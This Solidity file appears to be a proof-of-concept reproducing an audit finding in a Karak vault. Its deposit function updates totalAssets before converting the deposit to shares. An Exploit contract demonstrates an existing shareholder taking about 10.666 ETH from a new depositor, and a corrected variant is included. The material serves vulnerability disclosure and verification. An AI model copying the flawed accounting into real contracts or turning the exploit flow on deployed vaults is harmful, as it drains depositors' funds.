// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Karak NativeVault — H-04 (Pashov, June review)
    _increaseBalance adds `assets` to totalAssets BEFORE convertToShares.
    Starting from 32 ETH / 32 shares, Alice's 32 ETH mints 16 shares worth
    21.333 ETH. The existing shareholder redeems 10.666 ETH above principal.
    That 10.666 ETH is Alice's loss (1 wei of rounding stays in the vault).

    Verbatim order: totalAssets += assets; shares = convertToShares(assets); _mint.
*/

contract Asset {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NativeVault {
    Asset public asset;
    uint256 public totalAssets;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public ownerToNode;

    error DepositMoreThanMax();

    constructor(Asset _asset) {
        asset = _asset;
    }

    function maxDeposit(address) public pure returns (uint256) {
        return 1000 ether;
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0 || totalAssets == 0) return assets;
        return assets * supply / totalAssets;
    }

    /// @notice Report's initial 1:1 state. Not the vulnerable path.
    function bootstrap(address to, uint256 assets) external {
        require(totalSupply == 0, "boot");
        totalAssets = assets;
        _mint(to, assets);
    }

    function increaseBalance(address _of, uint256 assets) external {
        require(asset.transferFrom(msg.sender, address(this), assets), "pull");
        _increaseBalance(_of, assets);
    }

    function _increaseBalance(address _of, uint256 assets) internal {
        if (assets + totalAssets > maxDeposit(_of)) revert DepositMoreThanMax();
        totalAssets += assets; // @> VULN: shares are priced against assets that already include this deposit
        // FIX: uint256 shares = convertToShares(assets); _mint(_of, shares); totalAssets += assets;
        uint256 shares = convertToShares(assets);
        _mint(_of, shares);
        ownerToNode[_of] += assets;
    }

    /// @notice Recommended order. Not used by run().
    function increaseBalanceFixed(address _of, uint256 assets) external {
        require(asset.transferFrom(msg.sender, address(this), assets), "pull");
        if (assets + totalAssets > maxDeposit(_of)) revert DepositMoreThanMax();
        uint256 shares = convertToShares(assets);
        _mint(_of, shares);
        totalAssets += assets;
        ownerToNode[_of] += assets;
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        return shares * totalAssets / totalSupply;
    }

    function redeem(uint256 shares) external returns (uint256 assetsOut) {
        assetsOut = previewRedeem(shares);
        _burn(msg.sender, shares);
        totalAssets -= assetsOut;
        require(asset.transfer(msg.sender, assetsOut), "redeem");
    }

    function _mint(address to, uint256 shares) internal {
        balanceOf[to] += shares;
        totalSupply += shares;
    }

    function _burn(address from, uint256 shares) internal {
        balanceOf[from] -= shares;
        totalSupply -= shares;
    }
}

contract Alice {
    NativeVault public vault;
    Asset public asset;

    constructor(NativeVault _vault, Asset _asset) {
        vault = _vault;
        asset = _asset;
    }

    function approve() external {
        asset.approve(address(vault), type(uint256).max);
    }

    function deposit(uint256 assets) external {
        vault.increaseBalance(address(this), assets);
    }

    function depositFixed(uint256 assets) external {
        vault.increaseBalanceFixed(address(this), assets);
    }
}

contract PrincipalSink {
    Asset public asset;

    constructor(Asset _asset) {
        asset = _asset;
    }
}

contract Exploit {
    Asset public asset; // CREATE nonce 1
    NativeVault public vault; // CREATE nonce 2 — vulnerable
    Alice public alice; // CREATE nonce 3
    PrincipalSink public sink; // CREATE nonce 4

    constructor() {
        asset = new Asset();
        vault = new NativeVault(asset);
        alice = new Alice(vault, asset);
        sink = new PrincipalSink(asset);
        asset.mint(address(vault), 32 ether);
        vault.bootstrap(address(this), 32 ether); // totalAssets 32, supply 32, rate 1:1
        asset.mint(address(alice), 32 ether);
        alice.approve();
    }

    function run() external {
        alice.deposit(32 ether);
        require(vault.balanceOf(address(alice)) == 16 ether, "alice got 16 shares");
        require(vault.totalAssets() == 64 ether, "assets 64");
        require(vault.totalSupply() == 48 ether, "supply 48");
        uint256 aliceValue = vault.previewRedeem(vault.balanceOf(address(alice)));
        require(aliceValue == 21333333333333333333, "alice value 21.333 ETH");
        uint256 got = vault.redeem(32 ether);
        require(got == 42666666666666666666, "shareholder redeemed 42.666 ETH");
        // Return the 32 ETH principal so the leftover balance is only Alice's loss.
        require(asset.transfer(address(sink), 32 ether), "principal");
        require(asset.balanceOf(address(this)) == 10666666666666666666, "10.666 ETH profit");
        require(32 ether - aliceValue == 10666666666666666667, "alice short 10.666 ETH");
    }
}
